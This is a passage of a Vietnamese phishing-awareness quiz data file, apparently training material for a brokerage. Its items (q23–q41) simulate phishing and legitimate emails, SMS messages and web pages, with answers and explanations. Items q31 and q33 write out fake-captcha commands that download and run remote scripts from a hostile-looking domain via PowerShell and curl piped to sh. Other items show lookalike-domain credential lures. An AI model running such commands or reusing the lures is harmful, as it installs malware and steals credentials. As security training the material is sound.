        <p data-spot="danger" data-label="Lời hứa quyền lợi tài chính kết hợp thời hạn ngắn">Quý khách được tăng hạn mức margin 500 triệu VND nếu xác nhận trong 2 giờ.</p>
        <p><a data-spot="danger" data-label="Link xác nhận trên domain lạ" href="https://margin-vps-fast.net/approve" title="https://margin-vps-fast.net/approve">Xác nhận hạn mức</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Email đánh vào lợi ích tài chính và thời hạn ngắn. Domain người gửi và link đều không phải VPS chính thức.",
    indicators: [
      "Lời hứa tài chính",
      "Thời hạn gấp",
      "Domain người gửi và link đáng ngờ",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 23,
  },
  {
    id: "q24",
    title: "Mã OTP xác nhận giao dịch chứng khoán",
    category: "SMS",
    scenarioIntro: "Bạn nhận được SMS yêu cầu xác nhận OTP cho một giao dịch chứng khoán.",
    scenarioContent: "Kiểm tra xem tin nhắn bạn nhận được có đáng tin hay không?",
    scenarioHtml: `
      <div class="sms-sim">
        <p><strong>VPS-OTP</strong></p>
        <p data-spot="danger" data-label="SMS yêu cầu nhập OTP vào link lạ">Phát hiện lệnh đặt mua bất thường. Nhập OTP tại link sau để hủy lệnh.</p>
        <p><a data-spot="danger" data-label="Website thu thập OTP giả mạo VPS" href="https://otp-vps-confirm.com.vn" title="https://otp-vps-confirm.com.vn">otp-vps-confirm.com.vn</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "OTP không được nhập vào website lạ qua link SMS. Kẻ tấn công có thể dùng nội dung hủy lệnh để lừa người dùng tiết lộ mã xác thực.",
    indicators: [
      "Yêu cầu nhập OTP",
      "Link SMS giả mạo",
      "Dùng nỗi sợ giao dịch bất thường",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 24,
  },
  {
    id: "q25",
    title: "Đường dẫn VPS hiển thị trong email",
    category: "Email",
    scenarioIntro: "Bạn nhận được email có đường dẫn nhìn giống website chính thức của VPS.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="safe" data-label="Người gửi hiển thị đúng domain @vps.com.vn nhưng vẫn cần kiểm tra link bên trong"><strong>From:</strong> VPS Customer Service &lt;cskh@vps.com.vn&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Xác nhận thông tin tài khoản giao dịch</div>
        <p>Để tiếp tục sử dụng dịch vụ, Quý khách vui lòng kiểm tra thông tin tại:</p>
        <p>
          <a data-spot="danger" data-label="Text hiển thị là vps.com.vn nhưng hyperlink ẩn thực tế trỏ tới domain phishing" href="https://vps-com-vn.secure-verify-login.net/account" title="https://vps-com-vn.secure-verify-login.net/account">https://www.vps.com.vn/dang-nhap</a>
        </p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Đây là kiểu hyperlink ẩn: dòng chữ hiển thị giống domain hợp lệ nhưng đường dẫn thật bên dưới lại trỏ tới domain phishing. Email đúng domain cũng có thể bị lạm dụng hoặc bị giả mạo phần hiển thị, vì vậy cần kiểm tra link thực tế trước khi bấm.",
    indicators: [
      "Text link và href không khớp",
      "Link ẩn trỏ tới domain ngoài",
      "Sender có thể bị lạm dụng",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 25,
  },
  {
    id: "q26",
    title: "Tài liệu nội bộ được chia sẻ qua email",
    category: "Email",
    scenarioIntro: "Bạn nhận được email chia sẻ tài liệu từ hệ thống nội bộ.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="danger" data-label="Người gửi không thuộc hệ thống tài liệu nội bộ"><strong>From:</strong> Document Center &lt;sharepoint-notice@file-center.cloud&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Tài liệu lương tháng cần xác nhận</div>
        <p data-spot="danger" data-label="Dùng chủ đề nhạy cảm để kích thích người nhận bấm nhanh">Bảng lương tháng này cần được xác nhận trước 15:00.</p>
        <p>
          <a data-spot="danger" data-label="Text hiển thị là domain VPS nhưng href thật dẫn ra website giả mạo" href="https://vps-docs-verify.com/login" title="https://vps-docs-verify.com/login">https://confluence.vps.com.vn/payroll/confirm</a>
        </p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Kẻ tấn công thường đặt text link giống domain VPS để tạo cảm giác an toàn, nhưng href thật lại dẫn tới trang ngoài. Cần hover hoặc kiểm tra URL đích trước khi đăng nhập.",
    indicators: [
      "Hyperlink ẩn không khớp text",
      "Chủ đề lương nhạy cảm",
      "Người gửi ngoài hệ thống",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 26,
  },
  {
    id: "q27",
    title: "Xác nhận lịch bảo trì hệ thống nội bộ",
    category: "Email",
    scenarioIntro: "Bạn nhận được email thông báo bảo trì từ hệ thống nội bộ.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `<div class="mail-sim">
        <div class="mail-row" data-spot="safe" data-label="Người gửi đúng domain nội bộ VPS"><strong>From:</strong> IT Operations &lt;it-ops@vps.com.vn&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Lịch bảo trì VPN cuối tuần</div>
        <p data-spot="safe" data-label="Nội dung chỉ thông báo, không yêu cầu nhập mật khẩu hay OTP">VPN sẽ bảo trì từ 22:00 đến 23:00 thứ Bảy.</p>
        <p>
          <a data-spot="safe" data-label="Text link và href đều trỏ tới domain nội bộ VPS hợp lệ" href="https://confluence.vps.com.vn/it/vpn-maintenance" title="https://confluence.vps.com.vn/it/vpn-maintenance">https://confluence.vps.com.vn/it/vpn-maintenance</a>
        </p>
      </div>`,
    correctAnswer: "legitimate",
    explanation: "Đây là trường hợp hợp lệ: người gửi, text hiển thị và URL thật đều thuộc hệ thống nội bộ VPS; nội dung không yêu cầu thông tin nhạy cảm.",
    indicators: [
      "Text link khớp href",
      "Đúng domain nội bộ VPS",
      "Không yêu cầu thông tin nhạy cảm",
    ],
    active: false,
    alwaysIncluded: true,
    orderIndex: 27,
  },
  {
    id: "q28",
    title: "Cảnh báo giao dịch ngân hàng qua SMS",
    category: "SMS",
    scenarioIntro: "Bạn nhận được một SMS cảnh báo giao dịch ngân hàng trên điện thoại.",
    scenarioContent: "Kiểm tra xem tin nhắn bạn nhận được có đáng tin hay không?",
    scenarioHtml: `<div class="phone-sim">
        <div class="phone-frame">
          <div class="phone-status"><span>09:41</span><span>5G 82%</span></div>
          <div class="phone-header">
            <div class="phone-avatar">B</div>
            <div><strong>BIDV Alert</strong><span>SMS</span></div>
          </div>
          <div class="message-thread">
            <div class="message-bubble inbound">
              <p data-spot="danger" data-label="Cảnh báo giao dịch bất thường tạo cảm giác hoảng sợ">Phát hiện giao dịch 12.800.000 VND đang chờ xác nhận.</p>
              <p data-spot="danger" data-label="Yêu cầu hủy giao dịch qua link là dấu hiệu rất nguy hiểm">Nếu không phải bạn, hủy ngay tại:</p>
              <a data-spot="danger" data-label="Link SMS không thuộc domain ngân hàng chính thức" href="https://bidv-cancel-verify.net/otp" title="https://bidv-cancel-verify.net/otp">bidv-cancel-verify.net/otp</a>
            </div>
          </div>
        </div>
      </div>`,
    correctAnswer: "phishing",
    explanation: "SMS giả mạo thường dùng thông báo giao dịch lớn để tạo hoảng sợ, sau đó dụ người dùng bấm link và nhập OTP. Không nhập OTP hoặc thông tin ngân hàng qua link trong SMS.",
    indicators: [
      "Tạo hoảng sợ",
      "Link hủy giao dịch giả",
      "Có nguy cơ thu thập OTP",
    ],
    active: true,
    alwaysIncluded: true,
    orderIndex: 28,
  },
  {
    id: "q29",
    title: "Tin nhắn tài khoản VPS SmartOne",
    category: "SMS",
    scenarioIntro: "Bạn nhận được tin nhắn về tài khoản VPS SmartOne trên điện thoại.",
    scenarioContent: "Kiểm tra xem tin nhắn bạn nhận được có đáng tin hay không?",
    scenarioHtml: `
      <div class="phone-sim">
        <div class="phone-frame">
          <div class="phone-status"><span>10:18</span><span>Wi-Fi 76%</span></div>
          <div class="phone-header">
            <div class="phone-avatar">V</div>
            <div><strong>VPS</strong><span>SMS</span></div>
          </div>
          <div class="message-thread">
            <div class="message-bubble inbound">
              <p data-spot="danger" data-label="Thông báo khóa tài khoản trong thời gian ngắn nhằm thúc ép thao tác">Tai khoan SmartOne se bi tam khoa sau 20 phut neu chua dong bo thong tin.</p>
              <p>Truy cap:</p>
              <a data-spot="danger" data-label="Text có chữ VPS nhưng domain thật không phải vps.com.vn" href="https://smartone-vps-login.com/verify" title="https://smartone-vps-login.com/verify">smartone-vps-login.com/verify</a>
            </div>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Tin nhắn dùng áp lực khóa tài khoản và link có chữ VPS để tạo tin tưởng, nhưng domain không thuộc vps.com.vn. Không đăng nhập tài khoản chứng khoán qua link SMS lạ.",
    indicators: [
      "Thúc giục khóa tài khoản",
      "Domain giả mạo VPS",
      "Link đăng nhập trong SMS",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 29,
  },
  {
    id: "q30",
    title: "Cập nhật trạng thái giao hàng qua SMS",
    category: "SMS",
    scenarioIntro: "Bạn vừa đặt hàng và nhận được SMS cập nhật trạng thái giao hàng.",
    scenarioContent: "Kiểm tra xem tin nhắn bạn nhận được có đáng tin hay không?",
    scenarioHtml: `
      <div class="phone-sim">
        <div class="phone-frame">
          <div class="phone-status"><span>14:06</span><span>4G 68%</span></div>
          <div class="phone-header">
            <div class="phone-avatar">D</div>
            <div><strong>Delivery</strong><span>SMS</span></div>
          </div>
          <div class="message-thread">
            <div class="message-bubble inbound">
              <p data-spot="safe" data-label="Nội dung chỉ thông báo trạng thái đơn hàng, không yêu cầu thanh toán hay đăng nhập">Don hang DH90821 cua ban dang duoc giao trong hom nay.</p>
              <p data-spot="safe" data-label="Không có link, không yêu cầu OTP, không yêu cầu phí phát sinh">Nhan vien giao hang se lien he truoc khi giao. Cam on ban.</p>
            </div>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Tin nhắn chỉ thông báo trạng thái giao hàng, không có link, không yêu cầu thanh toán thêm và không yêu cầu OTP nên phù hợp với SMS hợp lệ.",
    indicators: [
      "Không có link",
      "Không yêu cầu OTP",
      "Nội dung đúng bối cảnh đặt hàng",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 30,
  },
  {
    id: "q31",
    title: "Màn hình xác minh Captcha trên website",
    category: "Website",
    scenarioIntro: "Bạn truy cập một website thông báo cần xác minh Captcha trước khi tiếp tục.",
    scenarioContent: "Kiểm tra trang web bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="portal-sim website-browser-template">
        <div class="browser-window">
          <div class="browser-topbar">
            <div class="browser-controls"><i></i></div>
            <div class="browser-address" data-spot="danger" data-label="Domain xác minh không thuộc hệ thống VPS"><span>https://vps-captcha-verify.com/check</span></div>
          </div>
          <div class="browser-page captcha-browser-page">
            <div class="captcha-verify">
              <h4>Security verification required</h4>
              <p data-spot="danger" data-label="Captcha hợp lệ không yêu cầu người dùng mở Run/Terminal hoặc dán lệnh hệ thống">To prove you are human, complete the verification on your computer.</p>
              <ul class="captcha-steps">
                <li data-spot="danger" data-label="Yêu cầu bấm Windows + R là hành vi rất bất thường với Captcha">Press <strong>Windows + R</strong></li>
                <li data-spot="danger" data-label="Yêu cầu Ctrl + V để dán lệnh là dấu hiệu phát tán mã độc">Press <strong>Ctrl + V</strong> to paste the verification code</li>
                <li>Press Enter to finish verification</li>
              </ul>
              <code class="captcha-command" data-spot="danger" data-label="Lệnh PowerShell tải và chạy mã từ Internet có nguy cơ cài mã độc">powershell -w hidden -c "iwr https://vps-captcha-verify.com/update.ps1 | iex"</code>
              <button type="button" data-spot="danger" data-label="Nút copy lệnh hệ thống không phải hành vi Captcha bình thường">Copy verification command</button>
            </div>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Captcha thật không yêu cầu người dùng mở hộp thoại Run, Terminal hay dán lệnh PowerShell. Đây là kỹ thuật lừa người dùng tự chạy mã độc trên máy.",
    indicators: [
      "Captcha yêu cầu chạy lệnh",
      "Domain không thuộc VPS",
      "PowerShell tải mã từ Internet",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 31,
  },
  {
    id: "q32",
    title: "Captcha trong phiên đăng nhập VPS",
    category: "Website",
    scenarioIntro: "Bạn đang mở trang đăng nhập chính thức của VPS và gặp bước xác minh Captcha.",
    scenarioContent: "Kiểm tra trang web bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `<div class="portal-sim website-browser-template">
        <div class="browser-window">
          <div class="browser-topbar">
            <div class="browser-controls"><i></i></div>
            <div class="browser-address" data-spot="safe" data-label="Domain thuộc hệ thống chính thức vps.com.vn"><span>https://www.vps.com.vn/dang-nhap</span></div>
          </div>
          <div class="browser-page captcha-browser-page">
            <div class="captcha-verify captcha-safe">
              <h4>Xác minh bảo mật</h4>
              <p data-spot="safe" data-label="Captcha hợp lệ chỉ yêu cầu thao tác trực tiếp trên trình duyệt, không yêu cầu chạy lệnh hệ thống">Vui lòng hoàn tất Captcha để tiếp tục đăng nhập.</p>
              <div class="captcha-checkbox" data-spot="safe" data-label="Checkbox Captcha là thao tác phổ biến và không yêu cầu tải file hay nhập mật khẩu lại">
                <span></span>
                <strong>Tôi không phải là robot</strong>
              </div>
              <p class="captcha-policy">Privacy - Terms</p>
              <button type="button">Tiếp tục</button>
            </div>
          </div>
        </div>
      </div>`,
    correctAnswer: "legitimate",
    explanation: "Captcha hiển thị trên domain chính thức vps.com.vn và chỉ yêu cầu thao tác xác minh trên trình duyệt, không yêu cầu chạy lệnh, tải file hay nhập OTP.",
    indicators: [
      "Domain chính thức",
      "Captcha thao tác trên trình duyệt",
      "Không yêu cầu chạy lệnh",
    ],
    active: true,
    alwaysIncluded: true,
    orderIndex: 32,
  },
  {
    id: "q33",
    title: "Captcha kèm hướng dẫn thao tác trên macOS",
    category: "Website",
    scenarioIntro: "Một website hiển thị Captcha nhưng yêu cầu bạn mở Terminal để hoàn tất xác minh.",
    scenarioContent: "Kiểm tra trang web bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="portal-sim website-browser-template">
        <div class="browser-window">
          <div class="browser-topbar">
            <div class="browser-controls"><i></i></div>
            <div class="browser-address" data-spot="danger" data-label="Domain dùng tên gần giống VPS nhưng không phải vps.com.vn"><span>https://vps-secure-captcha.com/verify</span></div>
          </div>
          <div class="browser-page captcha-browser-page">
            <div class="captcha-verify">
              <h4>Human verification for macOS</h4>
              <p data-spot="danger" data-label="Captcha thật không yêu cầu mở Terminal hoặc thực thi shell script">Open Terminal and paste the command below to continue.</p>
              <ul class="captcha-steps">
                <li data-spot="danger" data-label="Hướng dẫn mở Terminal là hành vi bất thường với Captcha">Open <strong>Terminal</strong></li>
                <li data-spot="danger" data-label="Yêu cầu dán lệnh làm tăng nguy cơ người dùng tự chạy mã độc">Paste copied verification command</li>
                <li>Press Return</li>
              </ul>
              <code class="captcha-command" data-spot="danger" data-label="Lệnh curl tải script từ domain giả mạo rồi chạy trực tiếp bằng shell">curl -fsSL https://vps-secure-captcha.com/check.sh | sh</code>
              <button type="button" data-spot="danger" data-label="Nút copy lệnh là dấu hiệu rất nguy hiểm, không phải Captcha hợp lệ">Copy for verification</button>
            </div>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Website giả mạo yêu cầu mở Terminal và chạy lệnh tải script từ Internet. Captcha hợp lệ không bao giờ yêu cầu người dùng thực thi lệnh hệ điều hành.",
    indicators: [
      "Domain gần giống VPS",
      "Yêu cầu mở Terminal",
      "Lệnh tải script từ Internet",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 33,
  },
  {
    id: "q34",
    title: "Captcha kèm yêu cầu cài tiện ích trình duyệt",
    category: "Website",
    scenarioIntro: "Bạn truy cập một trang báo cần cài tiện ích để vượt qua Captcha.",
    scenarioContent: "Kiểm tra trang web bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="portal-sim website-browser-template">
        <div class="browser-window">
          <div class="browser-topbar">
            <div class="browser-controls"><i></i></div>
            <div class="browser-address" data-spot="danger" data-label="Domain không phải hệ thống VPS và đang mạo danh kiểm tra bảo mật"><span>https://vps-browser-check.net/security</span></div>
          </div>
          <div class="browser-page captcha-browser-page">
            <div class="captcha-verify">
              <h4>Captcha blocked</h4>
              <p data-spot="danger" data-label="Captcha thật không yêu cầu cài extension để xác minh người dùng">Install the Secure Browser Verification extension to continue.</p>
              <div class="captcha-extension-card" data-spot="danger" data-label="Extension lạ có thể đánh cắp cookie, phiên đăng nhập hoặc dữ liệu trình duyệt">
                <span class="extension-icon">EXT</span>
                <div>
                  <strong>Secure Browser Verification</strong>
                  <p>Can read and change all your data on all websites</p>
                </div>
              </div>
              <button type="button" data-spot="danger" data-label="Nút cài tiện ích từ nguồn không rõ ràng là dấu hiệu nguy hiểm">Install extension</button>
            </div>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Captcha hợp lệ không yêu cầu cài tiện ích trình duyệt, đặc biệt là tiện ích có quyền đọc và thay đổi dữ liệu trên mọi website.",
    indicators: [
      "Yêu cầu cài extension",
      "Quyền truy cập dữ liệu rộng",
      "Domain không thuộc VPS",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 34,
  },
  {
    id: "q35",
    title: "Yêu cầu xác minh tài khoản VCB",
    category: "Email",
    scenarioIntro: "Bạn nhận được email thông báo tài khoản ngân hàng bị tạm khóa.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `<div class="invoice-sim">

  <!-- Bước 1: Người gửi -->
  <div class="mail-row"
       data-spot="danger"
       data-label="Địa chỉ người gửi không thuộc tên miền chính thức của Vietcombank">
    <strong>Từ:</strong> security@vietcombank-alert.com
  </div>

  <!-- Bước 2: Người nhận -->
  <div class="mail-row">
    <strong>Đến:</strong> __USER_EMAIL__
  </div>

  <!-- Bước 3: Tiêu đề -->
  <div class="mail-row"
       data-spot="danger"
       data-label="Tiêu đề tạo cảm giác khẩn cấp và gây áp lực yêu cầu xác minh ngay">
    <strong>Tiêu đề:</strong> ⚠️ Tài khoản của bạn bị tạm khóa - Xác minh ngay!
  </div>

  <!-- Nội dung email nằm trong một khung liền mạch -->
  <div class="mail-content">

    <p>Kính gửi Quý khách hàng,</p>

    <!-- Bước 4 -->
    <p>
      Chúng tôi phát hiện hoạt động
      <strong
        data-spot="danger"
        data-label="Cụm từ 'đáng ngờ' được dùng để tạo tâm lý lo sợ cho người nhận">
        đáng ngờ
      </strong>
      trên tài khoản của bạn. Để bảo vệ tài sản, tài khoản đã bị
      <strong
        data-spot="danger"
        data-label="Thông báo tài khoản bị tạm khóa nhằm tạo cảm giác lo sợ và buộc người dùng hành động">
        <span style="color:red">TẠM KHÓA</span>
      </strong>.
    </p>

    <!-- Bước 5 -->
    <p>
      Vui lòng xác minh danh tính trong
      <strong
        data-spot="danger"
        data-label="Giới hạn 24 giờ tạo áp lực thời gian, khiến người dùng dễ hành động vội vàng">
        24 giờ
      </strong>
      để tránh mất quyền truy cập vĩnh viễn:
    </p>

    <!-- Bước 6 -->
    <div
      data-spot="danger"
      data-label="Liên kết yêu cầu xác minh dẫn tới tên miền vietcombank-alert.com, không phải tên miền chính thức của Vietcombank">

      <a href="https://vietcombank-alert.com/xac-minh?ref=email&token=VCB2024&step=verify"
         onclick="return false;"
         style="background:#003087;color:white;padding:10px 20px;text-decoration:none;border-radius:4px;display:inline-block;margin:10px 0">
        Xác minh tài khoản ngay
      </a>

    </div>

    <p style="color:#888;font-size:12px">
      Vietcombank © 2026 | support@vcb.com.vn
    </p>

  </div>

</div>`,
    correctAnswer: "phishing",
    explanation: "Đây là email phishing giả mạo ngân hàng. Dấu hiệu chính là domain người gửi không chính thức, nội dung đe dọa khóa tài khoản và yêu cầu xác minh qua link lạ.",
    indicators: [
      "(1) Địa chỉ email người gửi là 'vietcombank-alert.com' thay vì 'vietcombank.com.vn' chính thức.",
      "(2) Tạo cảm giác khẩn cấp với thời gian '24 giờ'.",
      "(3) Ngân hàng thật không bao giờ yêu cầu xác minh qua email. Hãy gọi hotline chính thức nếu nghi ngờ.",
    ],
    active: true,
    alwaysIncluded: true,
    orderIndex: 35,
  },
  {
    id: "q36",
    title: "Đường dẫn rút gọn về phần thưởng Shopee",
    category: "Website",
    scenarioIntro: "Bạn nhận được tin nhắn từ một người quen nói rằng vừa trúng thưởng.",
    scenarioContent: "Kiểm tra trang web bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="portal-sim website-browser-template">
        <div class="browser-window">
          <div class="browser-topbar">
            <div class="browser-controls"><i></i></div>
            <div class="browser-address" data-spot="danger" data-label="Link rút gọn che giấu địa chỉ thật, người dùng không biết sẽ đi tới domain nào"><span>https://bit.ly/shopee-giftxyz</span></div>
          </div>
          <div class="browser-page">
            <h4>Chúc mừng bạn đã nhận được quà tặng Shopee</h4>
            <p>Trang đích sau khi mở link là <strong data-spot="danger" data-label="Domain shopee-gift.net không phải shopee.vn chính thức">http://shopee-gift.net/dang-nhap</strong>.</p>
            <p data-spot="danger" data-label="Mồi nhử trúng thưởng thường được dùng để dụ nhập tài khoản hoặc thông tin cá nhân">Điền thông tin đăng nhập để nhận iPhone 15 trong hôm nay.</p>
            <button type="button" data-spot="danger" data-label="Nút nhận thưởng dẫn người dùng tới form thu thập thông tin">Nhận thưởng ngay</button>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Đây là phishing. Link rút gọn che giấu URL thật, trang đích không thuộc shopee.vn và nội dung trúng thưởng là mồi nhử phổ biến.",
    indicators: [
      "Link rút gọn",
      "Domain Shopee giả",
      "Mồi nhử trúng thưởng",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 36,
  },
  {
    id: "q37",
    title: "Popup cảnh báo virus khi đang duyệt web",
    category: "Website",
    scenarioIntro: "Một trang web bất ngờ hiển thị popup cảnh báo máy tính bị nhiễm virus.",
    scenarioContent: "Kiểm tra trang web bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="portal-sim website-browser-template">
        <div class="browser-window">
          <div class="browser-topbar">
            <div class="browser-controls"><i></i></div>
            <div class="browser-address" data-spot="danger" data-label="Cảnh báo bảo mật xuất hiện từ website lạ, không phải ứng dụng bảo mật cài trên máy"><span>https://security-scan-warning.net/alert</span></div>
          </div>
          <div class="browser-page">
            <div class="captcha-verify">
              <h4 data-spot="danger" data-label="Tiêu đề gây hoảng loạn là đặc trưng của scareware">CẢNH BÁO BẢO MẬT</h4>
              <p>Máy tính của bạn bị nhiễm <strong data-spot="danger" data-label="Số lượng virus cụ thể thường là thông tin bịa đặt để gây sợ hãi">5 virus nguy hiểm</strong>.</p>
              <p data-spot="danger" data-label="Microsoft không hiển thị popup trên web yêu cầu gọi số hỗ trợ">Gọi ngay đường dây hỗ trợ Microsoft: 1800-xxx-xxxx</p>
              <button type="button" data-spot="danger" data-label="Nút quét virus trên website lạ có thể dẫn tới tải phần mềm độc hại hoặc lừa thanh toán">Quét virus ngay</button>
            </div>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Đây là scareware/phishing. Website lạ tạo cảnh báo virus giả, yêu cầu gọi số hỗ trợ hoặc bấm quét để dụ cài phần mềm điều khiển từ xa hay thanh toán giả.",
    indicators: [
      "Popup gây hoảng loạn",
      "Số hỗ trợ giả",
      "Nút quét virus trên website lạ",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 37,
  },
  {
    id: "q38",
    title: "Xác nhận đơn hàng Tiki",
    category: "Email",
    scenarioIntro: "Bạn nhận được email xác nhận đơn hàng từ Tiki sau khi mua hàng.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `<div class="email-mockup">
  <div class="email-header">
    <div class="email-field"><span class="label">Từ:</span> <span class="value" data-spot="safe" data-label="Địa chỉ gửi thuộc đúng tên miền chính thức tiki.vn">no-reply@tiki.vn</span></div>
    <div class="email-field"><span class="label">Đến:</span> <span class="value">__USER_EMAIL__</span></div>
    <div class="email-field"><span class="label">Tiêu đề:</span> <span class="value">Xác nhận đơn hàng #TK20260702-88421</span></div>
  </div>
  <div class="email-body">
    <p data-spot="safe" data-label="Thông tin đơn hàng cụ thể và khớp với đơn bạn vừa đặt">Xin chào, đơn hàng của bạn đã được xác nhận.</p>
    <table style="border-collapse:collapse;width:100%">
      <tr style="background:#f5f5f5"><td style="padding:8px"><strong>Sản phẩm</strong></td><td style="padding:8px">MacBook Pro 14 inch M5 - 24GB / 512GB</td></tr>
      <tr><td style="padding:8px"><strong>Mã đơn</strong></td><td style="padding:8px">#TK20260702-88421</td></tr>
      <tr style="background:#f5f5f5"><td style="padding:8px"><strong>Tổng tiền</strong></td><td style="padding:8px">47.990.000đ</td></tr>
      <tr><td style="padding:8px"><strong>Giao hàng dự kiến</strong></td><td style="padding:8px">02/07/2026</td></tr>
    </table>
    <p style="margin-top:12px" data-spot="safe" data-label="Chỉ mời theo dõi đơn hàng, không hỏi OTP hay yêu cầu thanh toán thêm">Theo dõi đơn hàng tại <a href="#">tiki.vn/order</a> hoặc ứng dụng Tiki.</p>
    <p style="color:#888;font-size:12px">© 2026 Tiki Corporation. 52 Út Tịch, Phường 4, Quận Tân Bình, Thành Phố Hồ Chí Minh</p>
  </div>
</div>`,
    correctAnswer: "legitimate",
    explanation: "Đây là email hợp lệ: domain người gửi đúng, nội dung chỉ xác nhận đơn hàng và không yêu cầu cung cấp thông tin nhạy cảm.",
    indicators: [
      "Domain chính thức",
      "Không yêu cầu OTP",
      "Thông tin đơn hàng rõ ràng",
    ],
    active: false,
    alwaysIncluded: true,
    orderIndex: 38,
  },
  {
    id: "q39",
    title: "Thông báo chia sẻ tài liệu SharePoint",
    category: "Email",
    scenarioIntro: "Bạn nhận được email thông báo có người chia sẻ file tài chính qua SharePoint.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="danger" data-label="Domain sharepoint-docshare.net không phải Microsoft hoặc SharePoint nội bộ của tổ chức"><strong>From:</strong> no-reply@sharepoint-docshare.net</div>
        <div class="mail-row"><strong>Subject:</strong> Michael Chen shared "Q4_Financial_Report_FINAL.xlsx" with you</div>
        <p><strong>Michael Chen</strong> shared a file with you.</p>
        <div class="attachment-card" data-spot="danger" data-label="File tài chính bất ngờ từ nguồn không xác minh có thể là mồi nhử đánh cắp tài khoản Microsoft 365">
          <span class="file-icon">XLS</span>
          <div><strong>Q4_Financial_Report_FINAL.xlsx</strong><p>Excel Workbook - 1.8 MB</p></div>
        </div>
        <p><a href="https://sharepoint-docshare.net/login" title="https://sharepoint-docshare.net/login" data-spot="danger" data-label="Nút mở SharePoint dẫn đến domain giả để thu thập thông tin đăng nhập">Open in SharePoint</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Đây là phishing giả mạo SharePoint. Người gửi dùng domain lạ và nút mở tài liệu dẫn đến trang đăng nhập giả để đánh cắp tài khoản Microsoft 365.",
    indicators: [
      "Domain SharePoint giả",
      "Tài liệu bất ngờ",
      "Nút mở dẫn tới login giả",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 39,
  },
  {
    id: "q40",
    title: "Mã QR truy cập cổng HR trong email",
    category: "QR",
    scenarioIntro: "Bạn nhận được email nhắc hoàn thành đánh giá KPI, trong email có mã QR để đăng nhập.",
    scenarioContent: "Kiểm tra mã QR cùng thông tin đi kèm và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row"><strong>From:</strong> HR Portal &lt;hr@vps.com.vn&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Xác nhận đánh giá KPI Q4 - Hạn chót 20/12</div>
        <p>Hệ thống HR yêu cầu bạn hoàn thành đánh giá KPI Q4 trước <strong data-spot="danger" data-label="Thời hạn gấp được dùng để thúc ép người nhận quét QR ngay">20/12/2024</strong>.</p>
        <div class="qr-card" data-spot="danger" data-label="Quét ra hrsystem-portal.net/kpi-review/login - trang đăng nhập giả mạo, QR giúp né bộ lọc link của email">
          <img class="qr-image" src="/assets/qr/qr-03.png" alt="Mã QR trong email" width="180" height="180" />
          <span>Quét bằng camera điện thoại để đăng nhập</span>
        </div>
        <p data-spot="danger" data-label="Yêu cầu chỉ dùng di động làm người dùng khó kiểm tra URL trước khi đăng nhập">Link chỉ hoạt động trên thiết bị di động.</p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Địa chỉ người gửi trông đúng chuẩn nội bộ nhưng đã bị giả mạo; dấu hiệu quyết định nằm ở mã QR - nó dẫn tới https://hrsystem-portal.net/kpi-review/login, một trang đăng nhập giả mạo. QR được dùng để né bộ lọc đường dẫn của email và ép bạn đăng nhập trên điện thoại, nơi khó kiểm tra tên miền.",
    indicators: [
      "Mã QR dẫn tới tên miền ngoài, không thuộc vps.com.vn",
      "Dùng QR để giấu đường dẫn khỏi bộ lọc email",
      "Ép xử lý gấp và chỉ cho dùng điện thoại",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 40,
  },
  {
    id: "q41",
    title: "Cập nhật tài khoản nhận lương",
    category: "Email",
    scenarioIntro: "Bạn nhận được email yêu cầu cập nhật thông tin lương trước kỳ trả lương.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
